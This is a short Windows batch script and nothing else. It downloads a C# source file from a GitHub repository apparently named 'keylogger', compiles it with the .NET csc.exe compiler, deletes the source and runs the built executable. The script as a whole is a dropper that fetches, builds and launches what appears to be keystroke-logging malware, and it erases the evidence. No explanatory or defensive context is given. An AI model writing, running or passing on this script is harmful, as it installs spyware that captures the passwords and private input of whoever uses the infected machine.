@echo off
curl -O https://raw.githubusercontent.com/w3irdguy/keylogger/main/exrealtime.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe exrealtime.cs
erase exrealtime.cs & exrealtime.exe
